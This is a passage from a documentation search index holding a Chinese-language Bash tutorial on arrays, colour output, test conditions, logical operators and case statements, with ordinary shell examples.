\u91cd\u7f6e=0\uff1b\u9ed1\u8272=30\uff1b\u7ea2\u8272=31\uff1b\u7eff\u8272=32\uff1b\u9ec4\u8272=33\uff1b\u84dd\u8272=34\uff1b\u6d0b\u7ea2=35\uff1b\u9752\u8272=36\uff1b\u767d\u8272=37 \u80cc\u666f\u8272\uff1a \u200b \u91cd\u7f6e=0\uff1b\u9ed1\u8272=40\uff1b\u7ea2\u8272=41\uff1b\u7eff\u8272=42\uff1b\u9ec4\u8272=43\uff1b\u84dd\u8272=44\uff1b\u6d0b\u7ea2=45\uff1b\u9752\u8272=46\uff1b\u767d\u8272=47","title":"\u6570\u7ec4"},{"location":"programming_language/bash/array/#_1","text":"\u6570\u7ec4\u662f\u7528\u6570\u7ec4\u7684\u540d\u5b57\u4fdd\u5b58\u4e00\u7ec4\u503c\u7684\u53d8\u91cf \u6570\u7ec4\u4e2d\u7684\u672f\u8bed\uff1a \u6570\u7ec4\u5143\u7d20 \u503c \u200b \u6570\u7ec4\u4e0b\u6807 \u8ddf\u5143\u7d20\u5bf9\u5e94\u7684 1\u3001\u5b9a\u4e49\u6570\u7ec4 declare -a \u6570\u7ec4\u540d=(\u503c) [root@shell script]# name=(tom mary jack) 2\u3001\u67e5\u770b\u6570\u7ec4\u4e2d\u7684\u67d0\u4e2a\u5143\u7d20\u7684\u503c [root@shell script]# echo ${name[1]} //\u4e2d\u62ec\u53f7\u91cc\u9762\u7684\u53eb\u505a\u4e0b\u6807 mary [root@shell script]# echo ${name[0]} tom [root@shell script]# echo ${name[2]} jack 3\u3001\u7ed9\u6570\u7ec4\u4e2d\u7684\u67d0\u4e2a\u5143\u7d20\u8d4b\u503c [root@shell script]# name[1]=rose [root@shell script]# echo ${name[1]} rose 4\u3001\u6570\u7ec4\u7684\u904d\u5386 [root@shell script]# echo ${name[*]} tom rose jack [root@shell script]# echo ${name[@]} 5\u3001\u663e\u793a\u6570\u7ec4\u5143\u7d20\u7684\u4e2a\u6570 [root@shell script]# echo ${#name[*]} 3 [root@shell script]# echo ${#name[@]} 3 6\u3001\u53d6\u6d88\u6570\u7ec4 [root@shell script]# unset name \u4f8b\u5b50\uff1a\u53cc\u8272\u7403 red\uff1a33\u90096 //6\u4e2a\u7ea2\u7403\uff0c\u9700\u8981\u4fdd\u5b58\u5230\u6570\u7ec4\u4e2d blue\uff1a16\u90091 [root@shell script]# echo $RANDOM //\u6253\u5370\u968f\u673a\u6570 12712 \u7ea2\u7403\uff1a [root@shell script]# echo $[$RANDOM%33+1] \u84dd\u7403\uff1a [root@shell script]# echo $[$RANDOM%16+1] \u6700\u7b80\u5355\u7684\u5f69\u7968\uff0c\u4f46\u662f\u7ea2\u7403\u53ef\u80fd\u4f1a\u91cd\u590d [root@shell script]# lottery.sh #!/bin/bash for i in `seq 6` do red[$i]=$[$RANDOM%33+1] echo -n \"${red[$i]} \" done echo echo \"$[$RANDOM%16+1]\" \u200b \u5f69\u8272\u8f93\u51fa\uff1a #!/bin/bash for i in `seq 6` do red[$i]=$[$RANDOM%33+1] echo -n -e \"\\e[1;31m ${red[$i]} \\e[0m\" done echo echo -e \"\\e[1;34m $[$RANDOM%16+1]\\e[0m\" \u989c\u8272\u8bbe\u5b9a\u4ee3\u7801\uff1a \u524d\u666f\u8272\uff1a \u200b \u91cd\u7f6e=0\uff1b\u9ed1\u8272=30\uff1b\u7ea2\u8272=31\uff1b\u7eff\u8272=32\uff1b\u9ec4\u8272=33\uff1b\u84dd\u8272=34\uff1b\u6d0b\u7ea2=35\uff1b\u9752\u8272=36\uff1b\u767d\u8272=37 \u80cc\u666f\u8272\uff1a \u200b \u91cd\u7f6e=0\uff1b\u9ed1\u8272=40\uff1b\u7ea2\u8272=41\uff1b\u7eff\u8272=42\uff1b\u9ec4\u8272=43\uff1b\u84dd\u8272=44\uff1b\u6d0b\u7ea2=45\uff1b\u9752\u8272=46\uff1b\u767d\u8272=47","title":"\u6570\u7ec4"},{"location":"programming_language/bash/branch/","text":"\u5206\u652f\u5224\u65ad \u547d\u4ee4\u6267\u884c\u662f\u5426\u6210\u529f $\uff1f shell\u5185\u7f6e\u7684\u5224\u65ad\u547d\u4ee4 test \u6761\u4ef6\u8868\u8fbe\u5f0f test 5 -gt 3 [] [ 5 -gt 3 ] //\u8868\u8fbe\u5f0f\u4e24\u8fb9\u4e00\u5b9a\u8981\u6709\u7a7a\u683c [[]] //\u652f\u6301\u6b63\u5219\u8868\u8fbe\uff0c\u66f4\u52a0\u4e25\u8c28 \u5b57\u7b26\u4e32\u5224\u65ad -n STRING \u2014\u2014 \u5b57\u7b26\u4e32\u975e\u7a7a\u65f6\u7ed3\u679c\u4e3a\u771f -z STRING \u2014\u2014 \u5b57\u7b26\u4e32\u4e3a\u7a7a\u65f6\u7ed3\u679c\u4e3a\u771f \u5224\u65ad\u5b57\u7b26\u4e32\u4e3a\u7a7a\u7684\u65b9\u6cd5\u6709\u4e09\u79cd\uff1a if [ \"$str\" = \"\" ] if [ x\"$str\" = x ] if [ -z \"$str\" ] \uff08-n \u4e3a\u975e\u7a7a\uff09 \u6ce8\u610f\uff1a\u90fd\u8981\u4ee3\u53cc\u5f15\u53f7\uff0c\u5426\u5219\u6709\u4e9b\u547d\u4ee4\u4f1a\u62a5\u9519\uff0c\u517b\u6210\u597d\u4e60\u60ef\u5427! STRING1=STRING2 \u2014\u2014 \u4e24\u4e2a\u5b57\u7b26\u4e32\u76f8\u540c\u65f6\u4e3a\u771f ==\u53cc\u7b49\u4e8e\u53f7\u548c=\u5355\u7b49\u4e8e\u53f7\u4f5c\u7528\u76f8\u540c\uff0c\u5728\u505a\u5b57\u7b26\u4e32\u6bd4\u8f83\u65f6\uff0c\u4f5c\u7528\u76f8\u540c STRING1!=STRING2 \u2014\u2014 \u4e24\u4e2a\u5b57\u7b26\u4e32\u4e0d\u76f8\u540c\u65f6\u4e3a\u771f \u6570\u503c\u6bd4\u8f83 ge le gt lt eq ne INTEGER1 -eq INTEGER2 \u2014\u2014 \u5224\u65ad\u4e24\u4e2a\u503c\u662f\u5426\u76f8\u7b49 INTEGER1 -ge INTEGER2 \u2014\u2014 \u5927\u4e8e\u7b49\u4e8e INTEGER1 -gt INTEGER2 \u2014\u2014 \u5927\u4e8e INTEGER1 -le INTEGER2 \u2014\u2014 \u5c0f\u4e8e\u7b49\u4e8e INTEGER1 -lt INTEGER2 \u2014\u2014 \u5c0f\u4e8e INTEGER1 -ne INTEGER2 \u2014\u2014 \u4e0d\u7b49\u4e8e (()) \u2014\u2014 \u6570\u503c\u6bd4\u8f83 \u53ef\u4ee5\u4f7f\u7528> < >= <= == != \u4f46\u662f\u5728\u8fd9\u91cc==\u8868\u793a\u76f8\u7b49\u5224\u65ad\uff0c=\u8868\u793a\u8d4b\u503c [root@bj docs]# ((5>3)) [root@bj docs]# echo $? 0 [root@bj docs]# ((5<3)) [root@bj docs]# echo $? 1 \u6587\u4ef6\u7684\u5224\u65ad -d FILE \u2014\u2014 \u5224\u65ad\u76ee\u5f55\u662f\u5426\u5b58\u5728 -e FILE \u2014\u2014 \u5224\u65ad\u6587\u4ef6\u662f\u5426\u5b58\u5728 -f FILE \u2014\u2014 \u5224\u65ad\u6587\u4ef6\u662f\u5426\u662f\u666e\u901a\u6587\u4ef6 -s FILE \u2014\u2014 \u5224\u65ad\u6587\u4ef6\u662f\u5426\u4e3a\u7a7a\u7684 -b \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u4e3a\u5757\u8bbe\u5907\u6587\u4ef6\uff08\u662f\u5757\u8bbe\u5907\u6587\u4ef6\u4e3a\u771f\uff09 -c\u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u4e3a\u5b57\u7b26\u8bbe\u5907\u6587\u4ef6\uff08\u662f\u5b57\u7b26\u8bbe\u5907\u6587\u4ef6\u4e3a\u771f\uff09 -d \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u4e3a\u76ee\u5f55\u6587\u4ef6\uff08\u662f\u76ee\u5f55\u4e3a\u771f\uff09 -e \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff08\u5b58\u5728\u4e3a\u771f\uff09 -f \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u4e3a\u666e\u901a\u6587\u4ef6\uff08\u662f\u666e\u901a\u6587\u4ef6\u4e3a\u771f\uff09 -L \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u4e3a\u7b26\u53f7\u94fe\u63a5\u6587\u4ef6\uff08\u662f\u7b26\u53f7\u94fe\u63a5\u6587\u4ef6\u4e3a\u771f\uff09 -p \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u4e3a\u7ba1\u9053\u6587\u4ef6\uff08\u662f\u7ba1\u9053\u6587\u4ef6\u4e3a\u771f\uff09 -s \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u4e3a\u975e\u7a7a\uff08\u975e\u7a7a\u4e3a\u771f\uff09 -S \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u4e3a\u5957\u63a5\u5b57\u6587\u4ef6\uff08\u662f\u5957\u63a5\u5b57\u6587\u4ef6\u4e3a\u771f\uff09 -r \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u8be5\u6587\u4ef6\u62e5\u6709\u8bfb\u6743\u9650\uff08 \u6709\u8bfb\u6743\u9650\u4e3a\u771f\uff09 -w\u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u8be5\u6587\u4ef6\u62e5\u6709\u5199\u6743\u9650\uff08 \u6709\u5199\u6743\u9650\u4e3a\u771f\uff09 -x \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u8be5\u6587\u4ef6\u62e5\u6709\u6267\u884c\u6743\u9650\uff08 \u6709\u6267\u884c\u6743\u9650\u4e3a\u771f\uff09 -u \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u8be5\u6587\u4ef6\u62e5\u6709SUID\u6743\u9650\uff08 \u6709SUID\u6743\u9650\u4e3a\u771f\uff09 -g \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u8be5\u6587\u4ef6\u62e5\u6709SGID\u6743\u9650\uff08 \u6709SGID\u6743\u9650\u4e3a\u771f\uff09 -k \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u8be5\u6587\u4ef6\u62e5\u6709SBit\u6743\u9650\uff08 \u6709SBit\u6743\u9650\u4e3a\u771f\uff09 \u6587\u4ef61 -nt \u6587\u4ef62 \u5224\u65ad\u6587\u4ef61\u7684\u4fee\u6539\u65f6\u95f4\u662f\u5426\u6bd4\u6587\u4ef62\u7684\u65b0\uff08 \u5982\u679c\u65b0\u5219\u4e3a\u771f\uff09 \u6587\u4ef61 -ot \u6587\u4ef62 \u5224\u65ad\u6587\u4ef61\u7684\u4fee\u6539\u65f6\u95f4\u662f\u5426\u6bd4\u6587\u4ef62\u7684\u65e7\uff08 \u5982\u679c\u65e7\u5219\u4e3a\u771f\uff09 \u6587\u4ef61 -ef \u6587\u4ef62 \u5224\u65ad\u6587\u4ef61\u662f\u5426\u548c\u6587\u4ef62\u7684Inode\u53f7\u4e00\u81f4\uff0c \u53ef\u4ee5\u7406\u89e3\u4e3a\u4e24\u4e2a\u6587\u4ef6\u662f\u5426\u4e3a\u540c\u4e00\u4e2a\u6587\u4ef6\u3002 \u8fd9\u4e2a\u5224\u65ad\u7528\u4e8e\u5224\u65ad\u786c\u94fe\u63a5\u662f\u5f88\u597d\u7684\u65b9\u6cd5 [root@shell script]# test -e /etc/passwd [root@shell script]# echo $? 0 [root@shell script]# [ -e /etc/passwd ] //\u6ce8\u610f\u7a7a\u683c [root@shell script]# echo $? 0 [root@shell script]# [ -d /douniwan ] [root@shell script]# echo $? 1 [root@shell script]# [ \"abcd\" = \"abcd\" ] //\u5b57\u7b26\u4e32\u4e24\u8fb9\u7528\u53cc\u5f15\u53f7\u5f15\u4e0a [root@shell script]# echo $? 0 [root@shell script]# [ \"abcd\" = \"abcde\" ] [root@shell script]# echo $? 1 [root@shell script]# name=haha [root@shell script]# [ \"$name\" = \"haha\" ] [root@shell script]# echo $? 0 [root@shell script]# [ \"$name\" = \"hahaha\" ] [root@shell script]# echo $? 1 [root@shell script]# [ 1 -eq 2 ] [root@shell script]# echo $? 1 [root@shell script]# [ 1 -le 2 ] [root@shell script]# echo $? 0 \u547d\u4ee4\u7684\u903b\u8f91\u8fd0\u7b97 \u903b\u8f91\u4e0e\uff1a && \u903b\u8f91\u6216\uff1a || \u903b\u8f91\u975e\uff1a ! \u5224\u65ad1 -a \u5224\u65ad2 \u903b\u8f91\u4e0e\uff0c \u5224\u65ad1\u548c\u5224\u65ad2\u90fd\u6210\u7acb\uff0c \u6700\u7ec8\u7684\u7ed3\u679c\u624d\u4e3a\u771f \u5224\u65ad1 -o \u5224\u65ad2 \u903b\u8f91\u6216\uff0c \u5224\u65ad1\u548c\u5224\u65ad2\u6709\u4e00\u4e2a\u6210\u7acb\uff0c \u6700\u7ec8\u7684\u7ed3\u679c\u5c31\u4e3a\u771f \u200b \u5982\u679c\u7528\u6237\u4e0d\u5b58\u5728\uff0c\u5c31\u6dfb\u52a0\u8be5\u7528\u6237 [root@shell script]# ! id user1 && useradd user1 uid=500(user1) gid=500(user1) groups=500(user1) [root@shell script]# ! id user10 && useradd user10 id: user10: No such user [root@shell script]# id user10 uid=509(user10) gid=509(user10) groups=509(user10) [root@shell script]# ! id user11 &>/dev/null && useradd user11 [root@shell script]# id user11 uid=510(user11) gid=510(user11) groups=510(user11) \u5982\u679c\u7528\u6237\u4e0d\u5b58\u5728\uff0c\u5c31\u6dfb\u52a0\u8be5\u7528\u6237\uff1b\u5426\u5219\u5c31\u6253\u5370\u7528\u6237\u5df2\u7ecf\u5b58\u5728\u7684\u4fe1\u606f [root@shell script]# ! id user11 && useradd user11 || echo \"user user11 already exists\" uid=510(user11) gid=510(user11) groups=510(user11) user user11 already exists","title":"\u5224\u65ad"},{"location":"programming_language/bash/branch/#_1","text":"","title":"\u5206\u652f\u5224\u65ad"},{"location":"programming_language/bash/branch/#_2","text":"$\uff1f","title":"\u547d\u4ee4\u6267\u884c\u662f\u5426\u6210\u529f"},{"location":"programming_language/bash/branch/#shell","text":"test \u6761\u4ef6\u8868\u8fbe\u5f0f test 5 -gt 3 [] [ 5 -gt 3 ] //\u8868\u8fbe\u5f0f\u4e24\u8fb9\u4e00\u5b9a\u8981\u6709\u7a7a\u683c [[]] //\u652f\u6301\u6b63\u5219\u8868\u8fbe\uff0c\u66f4\u52a0\u4e25\u8c28 \u5b57\u7b26\u4e32\u5224\u65ad -n STRING \u2014\u2014 \u5b57\u7b26\u4e32\u975e\u7a7a\u65f6\u7ed3\u679c\u4e3a\u771f -z STRING \u2014\u2014 \u5b57\u7b26\u4e32\u4e3a\u7a7a\u65f6\u7ed3\u679c\u4e3a\u771f \u5224\u65ad\u5b57\u7b26\u4e32\u4e3a\u7a7a\u7684\u65b9\u6cd5\u6709\u4e09\u79cd\uff1a if [ \"$str\" = \"\" ] if [ x\"$str\" = x ] if [ -z \"$str\" ] \uff08-n \u4e3a\u975e\u7a7a\uff09 \u6ce8\u610f\uff1a\u90fd\u8981\u4ee3\u53cc\u5f15\u53f7\uff0c\u5426\u5219\u6709\u4e9b\u547d\u4ee4\u4f1a\u62a5\u9519\uff0c\u517b\u6210\u597d\u4e60\u60ef\u5427! STRING1=STRING2 \u2014\u2014 \u4e24\u4e2a\u5b57\u7b26\u4e32\u76f8\u540c\u65f6\u4e3a\u771f ==\u53cc\u7b49\u4e8e\u53f7\u548c=\u5355\u7b49\u4e8e\u53f7\u4f5c\u7528\u76f8\u540c\uff0c\u5728\u505a\u5b57\u7b26\u4e32\u6bd4\u8f83\u65f6\uff0c\u4f5c\u7528\u76f8\u540c STRING1!=STRING2 \u2014\u2014 \u4e24\u4e2a\u5b57\u7b26\u4e32\u4e0d\u76f8\u540c\u65f6\u4e3a\u771f \u6570\u503c\u6bd4\u8f83 ge le gt lt eq ne INTEGER1 -eq INTEGER2 \u2014\u2014 \u5224\u65ad\u4e24\u4e2a\u503c\u662f\u5426\u76f8\u7b49 INTEGER1 -ge INTEGER2 \u2014\u2014 \u5927\u4e8e\u7b49\u4e8e INTEGER1 -gt INTEGER2 \u2014\u2014 \u5927\u4e8e INTEGER1 -le INTEGER2 \u2014\u2014 \u5c0f\u4e8e\u7b49\u4e8e INTEGER1 -lt INTEGER2 \u2014\u2014 \u5c0f\u4e8e INTEGER1 -ne INTEGER2 \u2014\u2014 \u4e0d\u7b49\u4e8e (()) \u2014\u2014 \u6570\u503c\u6bd4\u8f83 \u53ef\u4ee5\u4f7f\u7528> < >= <= == != \u4f46\u662f\u5728\u8fd9\u91cc==\u8868\u793a\u76f8\u7b49\u5224\u65ad\uff0c=\u8868\u793a\u8d4b\u503c [root@bj docs]# ((5>3)) [root@bj docs]# echo $? 0 [root@bj docs]# ((5<3)) [root@bj docs]# echo $? 1 \u6587\u4ef6\u7684\u5224\u65ad -d FILE \u2014\u2014 \u5224\u65ad\u76ee\u5f55\u662f\u5426\u5b58\u5728 -e FILE \u2014\u2014 \u5224\u65ad\u6587\u4ef6\u662f\u5426\u5b58\u5728 -f FILE \u2014\u2014 \u5224\u65ad\u6587\u4ef6\u662f\u5426\u662f\u666e\u901a\u6587\u4ef6 -s FILE \u2014\u2014 \u5224\u65ad\u6587\u4ef6\u662f\u5426\u4e3a\u7a7a\u7684 -b \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u4e3a\u5757\u8bbe\u5907\u6587\u4ef6\uff08\u662f\u5757\u8bbe\u5907\u6587\u4ef6\u4e3a\u771f\uff09 -c\u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u4e3a\u5b57\u7b26\u8bbe\u5907\u6587\u4ef6\uff08\u662f\u5b57\u7b26\u8bbe\u5907\u6587\u4ef6\u4e3a\u771f\uff09 -d \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u4e3a\u76ee\u5f55\u6587\u4ef6\uff08\u662f\u76ee\u5f55\u4e3a\u771f\uff09 -e \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff08\u5b58\u5728\u4e3a\u771f\uff09 -f \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u4e3a\u666e\u901a\u6587\u4ef6\uff08\u662f\u666e\u901a\u6587\u4ef6\u4e3a\u771f\uff09 -L \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u4e3a\u7b26\u53f7\u94fe\u63a5\u6587\u4ef6\uff08\u662f\u7b26\u53f7\u94fe\u63a5\u6587\u4ef6\u4e3a\u771f\uff09 -p \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u4e3a\u7ba1\u9053\u6587\u4ef6\uff08\u662f\u7ba1\u9053\u6587\u4ef6\u4e3a\u771f\uff09 -s \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u4e3a\u975e\u7a7a\uff08\u975e\u7a7a\u4e3a\u771f\uff09 -S \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u4e3a\u5957\u63a5\u5b57\u6587\u4ef6\uff08\u662f\u5957\u63a5\u5b57\u6587\u4ef6\u4e3a\u771f\uff09 -r \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u8be5\u6587\u4ef6\u62e5\u6709\u8bfb\u6743\u9650\uff08 \u6709\u8bfb\u6743\u9650\u4e3a\u771f\uff09 -w\u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u8be5\u6587\u4ef6\u62e5\u6709\u5199\u6743\u9650\uff08 \u6709\u5199\u6743\u9650\u4e3a\u771f\uff09 -x \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u8be5\u6587\u4ef6\u62e5\u6709\u6267\u884c\u6743\u9650\uff08 \u6709\u6267\u884c\u6743\u9650\u4e3a\u771f\uff09 -u \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u8be5\u6587\u4ef6\u62e5\u6709SUID\u6743\u9650\uff08 \u6709SUID\u6743\u9650\u4e3a\u771f\uff09 -g \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u8be5\u6587\u4ef6\u62e5\u6709SGID\u6743\u9650\uff08 \u6709SGID\u6743\u9650\u4e3a\u771f\uff09 -k \u6587\u4ef6 \u5224\u65ad\u8be5\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c \u5e76\u4e14\u662f\u5426\u8be5\u6587\u4ef6\u62e5\u6709SBit\u6743\u9650\uff08 \u6709SBit\u6743\u9650\u4e3a\u771f\uff09 \u6587\u4ef61 -nt \u6587\u4ef62 \u5224\u65ad\u6587\u4ef61\u7684\u4fee\u6539\u65f6\u95f4\u662f\u5426\u6bd4\u6587\u4ef62\u7684\u65b0\uff08 \u5982\u679c\u65b0\u5219\u4e3a\u771f\uff09 \u6587\u4ef61 -ot \u6587\u4ef62 \u5224\u65ad\u6587\u4ef61\u7684\u4fee\u6539\u65f6\u95f4\u662f\u5426\u6bd4\u6587\u4ef62\u7684\u65e7\uff08 \u5982\u679c\u65e7\u5219\u4e3a\u771f\uff09 \u6587\u4ef61 -ef \u6587\u4ef62 \u5224\u65ad\u6587\u4ef61\u662f\u5426\u548c\u6587\u4ef62\u7684Inode\u53f7\u4e00\u81f4\uff0c \u53ef\u4ee5\u7406\u89e3\u4e3a\u4e24\u4e2a\u6587\u4ef6\u662f\u5426\u4e3a\u540c\u4e00\u4e2a\u6587\u4ef6\u3002 \u8fd9\u4e2a\u5224\u65ad\u7528\u4e8e\u5224\u65ad\u786c\u94fe\u63a5\u662f\u5f88\u597d\u7684\u65b9\u6cd5 [root@shell script]# test -e /etc/passwd [root@shell script]# echo $? 0 [root@shell script]# [ -e /etc/passwd ] //\u6ce8\u610f\u7a7a\u683c [root@shell script]# echo $? 0 [root@shell script]# [ -d /douniwan ] [root@shell script]# echo $? 1 [root@shell script]# [ \"abcd\" = \"abcd\" ] //\u5b57\u7b26\u4e32\u4e24\u8fb9\u7528\u53cc\u5f15\u53f7\u5f15\u4e0a [root@shell script]# echo $? 0 [root@shell script]# [ \"abcd\" = \"abcde\" ] [root@shell script]# echo $? 1 [root@shell script]# name=haha [root@shell script]# [ \"$name\" = \"haha\" ] [root@shell script]# echo $? 0 [root@shell script]# [ \"$name\" = \"hahaha\" ] [root@shell script]# echo $? 1 [root@shell script]# [ 1 -eq 2 ] [root@shell script]# echo $? 1 [root@shell script]# [ 1 -le 2 ] [root@shell script]# echo $? 0 \u547d\u4ee4\u7684\u903b\u8f91\u8fd0\u7b97 \u903b\u8f91\u4e0e\uff1a && \u903b\u8f91\u6216\uff1a || \u903b\u8f91\u975e\uff1a ! \u5224\u65ad1 -a \u5224\u65ad2 \u903b\u8f91\u4e0e\uff0c \u5224\u65ad1\u548c\u5224\u65ad2\u90fd\u6210\u7acb\uff0c \u6700\u7ec8\u7684\u7ed3\u679c\u624d\u4e3a\u771f \u5224\u65ad1 -o \u5224\u65ad2 \u903b\u8f91\u6216\uff0c \u5224\u65ad1\u548c\u5224\u65ad2\u6709\u4e00\u4e2a\u6210\u7acb\uff0c \u6700\u7ec8\u7684\u7ed3\u679c\u5c31\u4e3a\u771f \u200b \u5982\u679c\u7528\u6237\u4e0d\u5b58\u5728\uff0c\u5c31\u6dfb\u52a0\u8be5\u7528\u6237 [root@shell script]# ! id user1 && useradd user1 uid=500(user1) gid=500(user1) groups=500(user1) [root@shell script]# ! id user10 && useradd user10 id: user10: No such user [root@shell script]# id user10 uid=509(user10) gid=509(user10) groups=509(user10) [root@shell script]# ! id user11 &>/dev/null && useradd user11 [root@shell script]# id user11 uid=510(user11) gid=510(user11) groups=510(user11) \u5982\u679c\u7528\u6237\u4e0d\u5b58\u5728\uff0c\u5c31\u6dfb\u52a0\u8be5\u7528\u6237\uff1b\u5426\u5219\u5c31\u6253\u5370\u7528\u6237\u5df2\u7ecf\u5b58\u5728\u7684\u4fe1\u606f [root@shell script]# ! id user11 && useradd user11 || echo \"user user11 already exists\" uid=510(user11) gid=510(user11) groups=510(user11) user user11 already exists","title":"shell\u5185\u7f6e\u7684\u5224\u65ad\u547d\u4ee4"},{"location":"programming_language/bash/case/","text":"case \u591a\u5206\u652f\u5224\u65ad \u8bed\u6cd5\u7ed3\u6784\uff1a case \u53d8\u91cf in \u503c1\uff09 \u547d\u4ee41 ;; \u503c2\uff09 \u547d\u4ee42 ;; ... ... ... ... \u503cn\uff09 \u547d\u4ee4n ;; *\uff09 \u547d\u4ee4 ;; esac \u5982\u679c\u53d8\u91cf\u7684\u503c\u6ee1\u8db3\u7684\u662f \u503c1\uff0c\u6267\u884c\u547d\u4ee41\uff1b\u5982\u679c\u4e0d\u6ee1\u8db3\uff0c\u7ee7\u7eed\u5411\u4e0b\u5339\u914d\u503c2\uff0c\u6267\u884c\u547d\u4ee42\uff0c... ... * \u8868\u793a\u7684\u901a\u914d\uff0c\u9664\u4e86\u4e0a\u9762\u6240\u6709\u7684\u503c\u4ee5\u5916\u7684\u503c \u6ce8\u610f\uff1a\u5206\u53f7\u548cesac \u53d8\u91cf\u5e38\u89c1\u7684 $name $1 $2 ... ... \u4f8b\u5b501\uff1a [root@shell script]# case1.sh #!/bin/bash read -p \"Please input a username: \" username case $username in root) echo \"You are super user.\" ;; oracle) echo \"You are oracle account.\" ;; *) echo \"You are nothing.\" ;; esac [root@shell script]# sh case1.sh Please input a username: root You are super user. [root@shell script]# sh case1.sh Please input a username: oracle You are oracle account. [root@shell script]# sh case1.sh Please input a username: douniwan You are nothing. \u4f8b\u5b502\uff1a\u5224\u65ad\u6210\u7ee9 [root@shell script]# case2.sh #!/bin/bash read -p \"Please input your score: \" score case $score in 9[0-9]|100) echo \"excellent\" ;; 8[0-9]) echo \"good\" ;; [67][0-9]) echo \"just so so\" ;; [0-9]|[1-5][0-9]) echo \"you must work hard\" ;; *) echo \"error\" ;; esac [0-9] : \u8868\u793a\u6570\u5b57 | : \u6216\u8005 \u540c\u65f6\u5339\u914d\u4e24\u4e2a\u53d8\u91cf\u7684\u65b9\u6cd5\uff1a 1\u3001\u5c06\u4e24\u4e2a\u53d8\u91cf\u770b\u6210\u4e00\u4e2a\u6574\u4f53 [root@shell script]# case3.sh #!/bin/bash read -p \"Please input your username: \" username read -s -p \"Please input your password: \" password echo case \"$username $password\" in \"root redhat\") echo \"You are right.\" ;; \"oracle ora\") echo \"You are right for oracle.\" ;; *) echo \"You are wrong.\" ;; esac 2\u3001\u7528\u4efb\u610f\u7b26\u53f7\u5206\u9694\u4e24\u4e2a\u53d8\u91cf case $username,$password in root,redhat)","title":"case\u8bed\u53e5"},{"location":"programming_language/bash/case/#case","text":"\u591a\u5206\u652f\u5224\u65ad \u8bed\u6cd5\u7ed3\u6784\uff1a case \u53d8\u91cf in \u503c1\uff09 \u547d\u4ee41 ;; \u503c2\uff09 \u547d\u4ee42 ;; ... ... ... ... \u503cn\uff09 \u547d\u4ee4n ;; *\uff09 \u547d\u4ee4 ;; esac \u5982\u679c\u53d8\u91cf\u7684\u503c\u6ee1\u8db3\u7684\u662f 